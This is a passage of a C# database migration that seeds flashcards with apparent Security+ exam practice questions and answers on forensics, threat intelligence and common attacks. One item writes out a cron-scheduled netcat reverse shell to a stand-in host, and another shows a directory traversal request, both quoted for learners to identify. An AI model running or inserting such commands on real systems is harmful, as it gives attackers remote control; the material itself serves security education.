                values: new object[] { 746, "\r\n114. D. Segmenting a network based on security or risk levels helps\r\nensure that attacks and compromises are constrained to the\r\nsame type of systems or devices with similar levels of security\r\nrequirements. Isolation would remove a device or system from\r\ncontact with the network or other systems. Fragmentation and\r\ntiering are not terms used for the Security+ exam.\r\n", 4, "\r\n114. Ed wants to ensure that a compromise on his network does not spread to parts of the\r\nnetwork with different security levels. What mitigation technique should he use prior to the\r\nattack to help with this?\r\nA. Isolation\r\nB. Fragmentation\r\nC. Tiering\r\nD. Segmentation\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 747, "\r\n115. A. Tagging each drive helps with inventory and ensures that the\r\ndrive is tracked properly and that the chain of custody can be\r\nmaintained. Taking a picture may be useful to identify the drive,\r\nbut tagging and inventory control are more important. Drives\r\nare not labeled with an order of volatility because the order of\r\nvolatility is associated with the type of forensic target, not with a\r\nspecific drive. Interviews may be useful but are not always\r\nconducted with every person whose machine is imaged.\r\n", 4, "\r\n115. Derek has acquired over 20 hard drives as part of a forensic investigation. What key process\r\nis important to ensure that each drive is tracked and managed properly over time?\r\nA. Tagging the drives\r\nB. Taking pictures of each drive\r\nC. Labeling each drive with its order of volatility\r\nD. Interviewing each person whose drive is imaged\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 748, "\r\n116. B. The provenance of a forensic artifact includes the chain of\r\ncustody, including ownership and acquisition of the artifact,\r\ndevice, or image. E-discovery is the process of doing discovery in\r\nelectronic formats for litigation, investigations, and records\r\nrequests. Jurisdiction is the region or area where laws or law\r\nenforcement has authority. Volatility is how likely a device or\r\ncomponent is to change.\r\n", 4, "\r\n116. What term describes the ownership, custody, and acquisition of digital forensic artifacts\r\nand images?\r\nA. E-discovery\r\nB. Provenance\r\nC. Jurisdiction\r\nD. Volatility\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 749, "\r\n117. B. The Volatility framework is a purpose-built tool for the\r\nacquisition of random access memory (RAM) from a live system.\r\nAutopsy is a forensic tool for drive analysis and forensic\r\ninvestigations, dd is used to image drives, and netcat is a tool\r\nused to transfer data or to make connections to systems across a\r\nnetwork.\r\n", 4, "\r\n117. Elle wants to acquire the live memory (RAM) from a machine that is currently turned on.\r\nWhich of the following tools is best suited to acquiring the contents of the system’s\r\nmemory?\r\nA. Autopsy\r\nB. The Volatility framework\r\nC. dd\r\nD. netcat\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 750, "\r\n118. D. Wireshark is a network protocol analyzer and capture tool\r\nthat can be used for troubleshooting in circumstances like this.\r\nIn fact, security practitioners are often asked to verify that traffic\r\nis being received properly as part of firewall rule\r\ntroubleshooting. Randy may want to capture traffic at both ends\r\nof the communication to make sure that the clients are sending\r\ntraffic properly and then to match that to the same traffic being\r\nreceived—or going missing—at the other end. tracert and\r\ntraceroute are useful for validating the route that traffic takes\r\nbut would not show if HTTPS packets were being blocked, and\r\nSn1per is a pen test framework that allows automated pen\r\ntesting.\r\n", 4, "\r\n118. Randy believes that a misconfigured firewall is blocking traffic sent from some systems in\r\nhis network to his web server. He knows that the traffic should be coming in as HTTPS to\r\nhis web server, and he wants to check to make sure the traffic is received. What tool can he\r\nuse to test his theory?\r\nA. tracert\r\nB. Sn1per\r\nC. traceroute\r\nD. Wireshark\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 751, "\r\n119. B. The oldest and least capable tool listed is syslog, the original\r\nsystem logging tool for Linux and Unix systems. The other three\r\noptions have advanced features, which mean that they are more\r\nbroadly implemented when flexibility and reliability are needed.\r\n", 4, "\r\n119. Ryan wants to implement a flexible and reliable remote logging environment for his Linux\r\nsystems. Which of the following tools is least suited to that requirement?\r\nA. rsyslog\r\nB. syslog\r\nC. NXLog\r\nD. syslog-ng\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 752, "\r\n120. A. The only tool on this list that can be used to craft packets is\r\nhping . Susan could use the sample code or exploit by building\r\nthe necessary packet with hping and then sending it to a\r\nDynamic Host Configuration Protocol (DHCP) server in her\r\nnetwork while monitoring with her intrusion prevention system\r\n(IPS). She may want to capture all of her traffic with Wireshark\r\nor tcpdump to observe what happens on both ends too!\r\n", 4, "\r\n120. Susan has been reading about a newly discovered exploit, and wants to test her IPS rules\r\nto see if the sample code will work. In order to use the exploit, she needs to send a specifically\r\ncrafted UDP packet to a DHCP server. What tool can she use to craft and send this test\r\nexploit to see if it is detected?\r\nA. hping\r\nB. scanless\r\nC. curl\r\nD. pathping\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 753, "\r\n121. D. SQL injection attempts are sent as HTTP or HTTPS requests\r\nto a web server, meaning that Valerie will be able to see the\r\nattacks in the web server log. Domain Name System (DNS) logs,\r\nif available, will not show these. Auth logs show logins, not web\r\nor SQL Server queries or requests. Unlike Windows, there is no\r\nsecurity log file for Linux, although there is a secure log for some\r\nsystems.\r\n", 4, "\r\n121. Valerie wants to check to see if a SQL injection attack occurred against her web application\r\non a Linux system. Which log file should she check for this type of information?\r\nA. The security log\r\nB. The DNS log\r\nC. The auth log\r\nD. The web server log\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 754, "\r\n122. A. If the private key and the passphrase for a certificate are\r\nexposed, the certificate should be revoked. A new certificate will\r\nneed to be issued, but the certificate cannot be trusted and\r\nrevocation is the first step to handle the issue properly.\r\nChanging the password will not help, and changing the private\r\nor public key will require a new certificate.\r\n", 4, "\r\n122. Olivia’s company has experienced a breach and believes that the attackers were able to\r\naccess the company’s web servers. There is evidence that the private keys for the certificates\r\nfor the server were exposed and that the passphrases for the certificates were kept in the\r\nsame directory. What action should Olivia take to handle this issue?\r\nA. Revoke the certificates.\r\nB. Change the certificate password.\r\nC. Change the private key for the certificate.\r\nD. Change the public key for the certificate.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 755, "\r\n123. C. A legal hold notice will inform the company that they must\r\npreserve and protect information related to the case. None of the\r\nother items are terms used in this process.\r\n", 4, "\r\n123. Jean’s company is preparing for litigation with another company that they believe has\r\ncaused harm to Jean’s organization. What type of legal action should Jean’s lawyer take to\r\nensure that the company preserves files and information related to the legal case?\r\nA. A chain of custody demand letter\r\nB. An e-discovery notice\r\nC. A legal hold notice\r\nD. An order of volatility\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 756, "\r\n124. B. netstat can show all active connections, and using the -a\r\nflag will do so. netstat does not provide a -c command flag. The\r\nroute command is used to modify and display the system’s\r\nrouting table. hping is a packet analyzer and packet building tool\r\noften used to craft specific packets as part of penetration tests\r\nand attacks.\r\n", 4, "\r\n124. Cynthia wants to display all of the active connections on a Windows system. What\r\ncommand can she run to do so?\r\nA. route\r\nB. netstat -a\r\nC. netstat -c\r\nD. hping\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 757, "\r\n125. B. A quarantine setting will place a malicious or suspect file in a\r\nsafe location and will keep it there until a set timeframe has\r\npassed or until an administrator takes action to deal with it. This\r\ncan allow you to further analyze the file or to restore it if it was\r\nan incorrect identification or if the file is needed for another\r\npurpose. Containment is used to limit the extent of an incident\r\nor attack, isolation keeps a system or device from connecting to\r\nor accessing others, and deleting a file wouldn’t keep it around.\r\n", 4, "\r\n125. What type of mitigation places a malicious file or application in a safe location for future\r\nreview or study?\r\nA. Containment\r\nB. Quarantine\r\nC. Isolation\r\nD. Deletion\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 758, "\r\n126. D. Although Linux systems can use a file for swap space, a\r\ncommon solution is to use a separate partition for swap space.\r\n", 4, "\r\n126. What location is commonly used for Linux swap space?\r\nA. \\root\\swap\r\nB. \\etc\\swap\r\nC. \\proc\\swap\r\nD. A separate partition\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 759, "\r\n127. A. Tracking multiple drives requires careful inventory, evidence\r\nhandling logging, and tagging of the drives to ensure that they\r\nare the right drive and that they are tracked throughout the\r\nforensic investigation. Marco should carefully tag each of the\r\ndrives and ensure that those tags are used throughout the\r\ninvestigation.\r\n", 4, "\r\n127. Marco is conducting a forensic investigation and is preparing to pull eight different storage\r\ndevices from computers that he will analyze. What should he use to track the drives as he\r\nworks with them?\r\nA. Tags with system, serial number, and other information\r\nB. MD5 checksums of the drives\r\nC. Timestamps gathered from the drives\r\nD. None of the above; the drives can be identified by the data they contain\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 789, "\r\n14. A. A deterrent control is used to warn a potential attacker not\r\nto attack. Lighting added to the perimeter and warning signs\r\nsuch as a “no trespassing” sign are deterrent controls. The other\r\noptions are examples of detective controls. A detective control is\r\ndesigned to uncover a violation, although some detective\r\ncontrols may serve as a deterrent—for example, when a camera\r\nis visible, they are not primarily deterrent controls.\r\n", 5, "\r\n14. You are the new security administrator and have discovered your company lacks deterrent\r\ncontrols. Which of the following would you install that satisfies your needs?\r\nA. Lighting\r\nB. Motion sensor\r\nC. Hidden video cameras\r\nD. Antivirus scanner\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 452, "\r\n46. D. The CN, or common name, for a certificate for a system is\r\ntypically the fully qualified domain name (FQDN) for the server.\r\nIf Megan was requesting a certificate for herself, instead of for a\r\nserver, she would use her full name.\r\n", 3, "\r\n46. Megan is preparing a certificate signing request (CSR) and knows that she needs to provide a\r\nCN for her web server. What information will she put into the CN field for the CSR?\r\nA. Her name\r\nB. The hostname\r\nC. The company’s name\r\nD. The fully qualified domain name of the system\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 451, "\r\n45. D. Identity attributes are characteristics of an identity,\r\nincluding details like the individual’s birth date, age, job title,\r\naddress, or a multitude of other details about the identity. They\r\nare used to differentiate the identity from others and may also\r\nbe used by the identity management system or connected\r\nsystems in coordination with the identity itself. Roles describe\r\nthe job or position an individual has in an organization, and\r\nfactors are something you know, something you have, or\r\nsomething you are. Identifiers are not a common security or\r\nauthentication term, although identity is.\r\n", 3, "\r\n45. Nina wants to use information about her users like their birth dates, addresses, and job\r\ntitles as part of her identity management system. What term is used to describe this type of\r\ninformation?\r\nA. Roles\r\nB. Factors\r\nC. Identifiers\r\nD. Attributes\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 450, "\r\n44. A. A DMZ (demilitarized zone) provides limited access to\r\npublic-facing servers for outside users, but blocks outside users\r\nfrom accessing systems inside the LAN. It is a common practice\r\nto place web servers in the DMZ. A virtual LAN, or VLAN, is\r\nmost often used to segment the internal network, routers direct\r\ntraffic based on IP address, and a guest network allows internal\r\nusers who are not employees to get access to the Internet.\r\n", 3, "\r\n44. Which design concept limits access to systems from outside users while protecting users and\r\nsystems inside the LAN?\r\nA. DMZ\r\nB. VLAN\r\nC. Router\r\nD. Guest network\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 143, "\r\n143. D. Browser toolbars are sometimes examples of PUPs, or\r\npotentially unwanted programs like spyware or adware. A worm\r\nis a type of malware that spreads on its own by exploiting\r\nvulnerabilities on network-connected systems. Once it infects a\r\nsystem, it will typically scan for other vulnerable systems and\r\ncontinue to spread. A RAT is a remote-access Trojan, and a\r\nrootkit is used to gain and keep administrative access.\r\n", 1, "\r\n143. A browser toolbar is an example of what type of malware?\r\nA. A rootkit\r\nB. A RAT\r\nC. A worm\r\nD. A PUP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 144, "\r\n144. B. OSINT, or open source intelligence, is intelligence\r\ninformation obtained from public sources like search engines,\r\nwebsites, domain name registrars, and a host of other locations.\r\nOPSEC, or operational security, refers to habits such as not\r\ndisclosing unnecessary information. STIX is the Structured\r\nThreat Intelligence Exchange protocol, and IntCon was made up\r\nfor this question.\r\n", 1, "\r\n144. What term describes data that is collected from publicly available sources that can be used\r\nin an intelligence context?\r\nA. OPSEC\r\nB. OSINT\r\nC. IntCon\r\nD. STIX\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 145, "\r\n145. C. Watering hole attacks target groups by focusing on common\r\nshared behaviors like visiting specific websites. If attackers can\r\ncompromise the site or deliver targeted attacks through it, they\r\ncan then target that group. Watercooler, phishing net, and phish\r\npond attacks were all made up for this question.\r\n", 1, "\r\n145. What type of attack targets a specific group of users by infecting one or more websites that\r\nthat group is specifically known to visit frequently?\r\nA. A watercooler attack\r\nB. A phishing net attack\r\nC. A watering hole attack\r\nD. A phish pond attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 146, "\r\n146. C. Although Structured Query Language (SQL) queries are\r\noften parameterized, Lightweight Directory Access Protocol\r\n(LDAP) security practices focus instead on user input validation\r\nand filtering of output to ensure that an excessive amount of\r\ndata is not being returned in queries. As with all services,\r\nsecurely configuring LDAP services is one of the first protections\r\nthat should be put in place.\r\n", 1, "\r\n146. Tracy is concerned about LDAP injection attacks against her directory server. Which of the\r\nfollowing is not a common technique to prevent LDAP injection attacks?\r\nA. Secure configuration of LDAP\r\nB. User input validation\r\nC. LDAP query parameterization\r\nD. Output filtering rules\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 147, "\r\n147. B. Although it may sound dramatic, sites accessible via Tor or\r\nother tools that separate them from the rest of the Internet are\r\nsometimes called “the dark web.” The Security+ exam uses this\r\nterm, so you need to be aware of it for the exam. The rest of the\r\noptions were made up and may be almost as silly as calling a\r\nsection of the Internet the dark web.\r\n", 1, "\r\n147. Fred uses a Tor proxy to browse for sites as part of his threat intelligence. What term is\r\nfrequently used to describe this part of the Internet?\r\nA. Through the looking glass\r\nB. The dark web\r\nC. The underweb\r\nD. Onion-space\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 148, "\r\n148. B. URL redirection has many legitimate uses, from redirecting\r\ntraffic from no-longer-supported links to current replacements\r\nto URL shortening, but URL redirection was commonly used for\r\nphishing attacks. Modern browsers display the full, real URL,\r\nhelping to limit the impact of this type of attack. Certificate\r\nexpiration tracking is used to ensure that website certificates are\r\ncurrent, but it does not prevent URL redirection attacks.\r\nJavaScript being enabled or disabling cookies is not helpful for\r\nthis purpose either.\r\n", 1, "\r\n148. What browser feature is used to help prevent successful URL redirection attacks?\r\nA. Certificate expiration tracking\r\nB. Displaying the full real URL\r\nC. Disabling cookies\r\nD. Enabling JavaScript\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 149, "\r\n149. A. Vulnerabilities in cloud services require work on the part of\r\nthe cloud service provider to remediate them. You can remediate\r\nmost vulnerabilities in your own infrastructure yourself without\r\na third party. Vulnerabilities in cloud services and local\r\ninfrastructure can both be as severe and take as much time to\r\nremediate. Regardless of where your organization stores its data,\r\nyour responsibility for it is likely the same!\r\n", 1, "\r\n149. What is the most significant difference between cloud service-based and on-premises\r\nvulnerabilities?\r\nA. Your ability to remediate it yourself\r\nB. The severity of the vulnerability\r\nC. The time required to remediate\r\nD. Your responsibility for compromised data\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 150, "\r\n150. C. Consumer wireless routers provide local administrative\r\naccess via their default credentials. Although they recommend\r\nthat you change the password (and sometimes the username for\r\ngreater security), many installations result in an unsecured\r\nadministrative account. The other answers are all common\r\nissues but not what is described in the question.\r\n", 1, "\r\n150. Christina runs a vulnerability scan of a customer network and discovers that a consumer\r\nwireless router on the network returns a result reporting default login credentials. What\r\ncommon configuration issue has she encountered?\r\nA. An unpatched device\r\nB. An out of support device\r\nC. An unsecured administrator account\r\nD. An unsecured user account\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 151, "\r\n151. A. A red team is a team that tests security by using tools and\r\ntechniques like an actual attacker. A blue team is a defender\r\nteam that protects against attackers (and testers like red\r\nteams!). Purple teams are a combination of red and blue teams\r\nintended to leverage the techniques and tools from both sides to\r\nimprove organizational security. White teams oversee\r\ncybersecurity contests and judge events between red teams and\r\nblue teams.\r\n", 1, "\r\n151. What type of team is used to test security by using tools and techniques that an actual\r\nattacker would use?\r\nA. A red team\r\nB. A blue team\r\nC. A white team\r\nD. A purple team\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 152, "\r\n152. A. Directory traversal attacks attempt to exploit tools that can\r\nread directories and files by moving through the directory\r\nstructure. The example would try to read the config.txt file\r\nthree layers above the working directory of the web application\r\nitself. Adding common directory names or common filenames\r\ncan allow attackers (or penetration testers) to read other files in\r\naccessible directories if they are not properly secured. The\r\nremainder of the options were made up for this question,\r\nalthough Slashdot is an actual website.\r\n", 1, "\r\n152. While reviewing web logs for her organization’s website Kathleen discovers the entry\r\nshown here:\r\nGET http://example.com/viewarticle.php?view=../../../config.txt HTTP/1.1\r\nWhat type of attack has she potentially discovered?\r\nA. A directory traversal attacks\r\nB. A web application buffer overflow\r\nC. A directory recursion attack\r\nD. A slashdot attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 153, "\r\n153. A. Security orchestration, automation, and response (SOAR)\r\nservices are designed to integrate with a broader range of both\r\ninternal and external applications. Both security information\r\nand event management (SIEM) and SOAR systems typically\r\ninclude threat and vulnerability management tools, as well as\r\nsecurity operations’ automation capabilities.\r\n", 1, "\r\n153. What is the key differentiator between SOAR and SIEM systems?\r\nA. SOAR integrates with a wider range of applications.\r\nB. SIEM includes threat and vulnerability management tools.\r\nC. SOAR includes security operations automation.\r\nD. SIEM includes security operations automation.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 142, "\r\n142. D. Active reconnaissance connects to the network using\r\ntechniques such as port scanning. Both active and passive\r\nreconnaissance can be done manually or with tools. Black-box\r\nand white-box refer to the amount of information the tester is\r\ngiven. Attackers and testers use both types of reconnaissance.\r\n", 1, "\r\n142. What is the primary difference between active and passive reconnaissance?\r\nA. Active will be done manually, passive with tools.\r\nB. Active is done with black-box tests and passive with white-box tests.\r\nC. Active is usually done by attackers and passive by testers.\r\nD. Active will actually connect to the network and could be detected; passive won’t.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 154, "\r\n154. A. A known environment (white-box) test involves providing\r\nextensive information, as described in this scenario. A known\r\nenvironment test could be internal or external. This scenario\r\ndescribes the opposite of an unknown environment (black-box)\r\ntest, which would involve zero knowledge. Finally, threat test is\r\nnot a term used in penetration testing.\r\n", 1, "\r\n154. Your company has hired a penetration testing firm to test the network. For the test, you\r\nhave given the company details on operating systems you use, applications you run, and\r\nnetwork devices. What best describes this type of test?\r\nA. Known environment test\r\nB. External test\r\nC. Unknown environment test\r\nD. Threat test\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 156, "\r\n156. C. An SSL stripping attack requires attackers to persuade a\r\nvictim to send traffic through them via HTTP while continuing\r\nto send HTTPS encrypted traffic to the legitimate server by\r\npretending to be the victim. This is not a brute-force attack, a\r\nTrojan attack would require malware, and a downgrade attack\r\nwould try to move the encrypted session to a less secure\r\nencryption protocol.\r\n", 1, "\r\n156. What type of attack is an SSL stripping attack?\r\nA. A brute-force attack\r\nB. A Trojan attack\r\nC. An on-path attack\r\nD. A downgrade attack\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 157, "\r\n157. C. The U.S. Trusted Foundry program is intended to prevent\r\nsupply chain attacks by ensuring end-to-end supply chain\r\nsecurity for important integrated circuits and electronics.\r\n", 1, "\r\n157. What type of attack is the U.S. Trusted Foundry program intended to help prevent?\r\nA. Critical infrastructure attacks\r\nB. Metalwork and casting attacks\r\nC. Supply chain attacks\r\nD. Software source code attacks\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 158, "\r\n158. B. Threat maps like those found at threatmap.fortiguard.com\r\nand threatmap.checkpoint.com are visualizations of real-time or\r\nnear real-time data gathered by vendors and other organizations\r\nthat can help visualize major threats and aid in analysis of them.\r\nPie charts may be done in real time via security information and\r\nevent management (SIEM) or other systems, but note that no\r\nSIEM or other device was mentioned. A dark web tracker was\r\nmade up for the question, and OSINT repositories wouldn’t\r\nshow real-time data like this.\r\n", 1, "\r\n158. Nicole wants to show the management in her organization real-time data about attacks\r\nfrom around the world via multiple service providers in a visual way. What type of threat\r\nintelligence tool is often used for this purpose?\r\nA. A pie chart\r\nB. A threat map\r\nC. A dark web tracker\r\nD. An OSINT repository\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 159, "\r\n159. B. Bluesnarfing involves accessing data from a Bluetooth device\r\nwhen it is in range. Bluejacking involves sending unsolicited\r\nmessages to Bluetooth devices when they are in range. Evil twin\r\nattacks use a rogue access point whose name is similar or\r\nidentical to that of a legitimate access point. A RAT is a remoteaccess\r\nTrojan, and nothing in this scenario points to a RAT\r\nbeing the cause of the stolen data.\r\n", 1, "\r\n159. You have noticed that when in a crowded area, data from your cell phone is stolen. Later\r\ninvestigation shows a Bluetooth connection to your phone, one that you cannot explain.\r\nWhat describes this attack?\r\nA. Bluejacking\r\nB. Bluesnarfing\r\nC. Evil twin\r\nD. RAT\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 160, "\r\n160. B. The rules of engagement for a penetration test typically\r\ninclude the type and scope of testing, client contact information\r\nand requirements for when the team should be notified,\r\nsensitive data handling requirements, and details of regular\r\nstatus meetings and reports.\r\n", 1, "\r\n160. The type and scope of testing, client contact details, how sensitive data will be handled, and\r\nthe type and frequency of status meetings and reports are all common elements of what\r\nartifact of a penetration test?\r\nA. The black-box outline\r\nB. The rules of engagement\r\nC. The white-box outline\r\nD. The close-out report\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 161, "\r\n161. C. This command starts a reverse shell connecting to\r\nexample.com on port 8989 every hour. If you’re not familiar with\r\ncron , you should take a moment to read the basics of cron\r\ncommands and what you can do with them—you can read a man\r\npage for cron at\r\nmanpages.ubuntu.com/manpages/focal/man8/cron.8.html.\r\n", 1, "\r\n161. Amanda encounters a Bash script that runs the following command:\r\ncrontab -e 0 * * * * nc example.com 8989 -e /bin/bash\r\nWhat does this command do?\r\nA. It checks the time every hour.\r\nB. It pulls data from example.com every minute.\r\nC. It sets up a reverse shell.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 162, "\r\n162. C. The penetration tester leveraged the principle of urgency\r\nand also used some elements of authority by claiming to be a\r\nsenior member of the organization. They didn’t threaten or\r\nintimidate the help desk staff member and did not make\r\nsomething seem scarce, nor did they attempt to build trust with\r\nthe staff member.\r\n", 1, "\r\n162. A penetration tester called a help desk staff member at the company that Charles works at\r\nand claimed to be a senior executive who needed her password changed immediately due to\r\nan important meeting they needed to conduct that would start in a few minutes. The staff\r\nmember changed the executive’s password to a password that the penetration tester provided.\r\nWhat social engineering principle did the penetration tester leverage to accomplish this attack?\r\nA. Intimidation\r\nB. Scarcity\r\nC. Urgency\r\nD. Trust\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 163, "\r\n163. A. Proprietary, or closed threat, intelligence is threat\r\nintelligence that is not openly available. OSINT, or open source\r\nthreat intelligence, is freely available. ELINT is a military term\r\nfor electronic and signals intelligence. Corporate threat\r\nintelligence was made up for this question.\r\n", 1, "\r\n163. Patrick has subscribed to a commercial threat intelligence feed that is only provided to subscribers\r\nwho have been vetted and who pay a monthly fee. What industry term is used to\r\nrefer to this type of threat intelligence?\r\nA. Proprietary threat intelligence\r\nB. OSINT\r\nC. ELINT\r\nD. Corporate threat intelligence\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 164, "\r\n164. B. CompTIA defines “maneuver” in the context of threat\r\nhunting as how to think like a malicious user to help you identify\r\npotential indicators of compromise in your environment.\r\nOutside of the Security+ exam, this is not a commonly used term\r\nin normal security practice, although it does make an\r\nappearance in military usage. Since this term is not common\r\noutside of the Security+ exam, make sure you understand the\r\nCompTIA definition. Intelligence fusion adds multiple\r\nintelligence sources together, threat feeds are used to provide\r\ninformation about threats, and advisories and bulletins are often\r\ncombined with threat feeds to understand new attacks,\r\nvulnerabilities, and other threat information.\r\n", 1, "\r\n164. What threat hunting concept involves thinking like a malicious actor to help identify\r\nindicators of compromise that might otherwise be hidden?\r\nA. Intelligence fusion\r\nB. Maneuver\r\nC. Threat feed analysis\r\nD. Bulletin analysis\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 165, "\r\n165. B. Script kiddies are the least resourced of the common threat\r\nactors listed above. In general, they flow from national state\r\nactors as the most highly resourced, to organized crime, to\r\nhacktivists, to inside actors, and then to script kiddies as the\r\nleast capable and least resourced actors. As with any scale like\r\nthis, there is room for some variability between specific actors,\r\nbut for the exam, you should track them in that order.\r\n", 1, "\r\n165. What type of malicious actor will typically have the least amount of resources available\r\nto them?\r\nA. Nation-states\r\nB. Script kiddies\r\nC. Hacktivists\r\nD. Organized crime\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 166, "\r\n166. B. A SYN flood is a type of resource exhaustion attack and uses\r\nup all available sessions on the system it is aimed at. Although a\r\nSYN flood can be a DDoS, no mention was made of multiple\r\nsource machines for the attack. No application was mentioned,\r\nand a SYN flood targets the TCP/IP stack on the system rather\r\nthan an application. No vulnerability was mentioned, and none\r\nis required for a SYN flood, since it simply tries to overwhelm\r\nthe target’s ability to handle the opened connections.\r\nProtections against SYN floods tend to focus on preventing\r\nopened connections from causing resource exhaustion and\r\nidentifying and blocking abusive hosts.\r\n", 1, "\r\n166. A SYN flood seeks to overwhelm a system by tying up all the open sessions that it can create.\r\nWhat type of attack is this?\r\nA. A DDoS\r\nB. A resource exhaustion attack\r\nC. An application exploit\r\nD. A vulnerability exploit\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 155, "\r\n155. C. The Windows Security Account Manager (SAM) file and the\r\n/etc/shadow file for Linux systems both contain passwords and\r\nare popular targets for offline brute-force attacks.\r\n", 1, "\r\n155. What two files are commonly attacked using offline brute-force attacks?\r\nA. The Windows registry and the Linux /etc/passwd file\r\nB. The Windows SAM and the Linux /etc/passwd file\r\nC. The Windows SAM and the Linux /etc/shadow file\r\nD. The Windows registry and the Linux /etc/shadow file\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
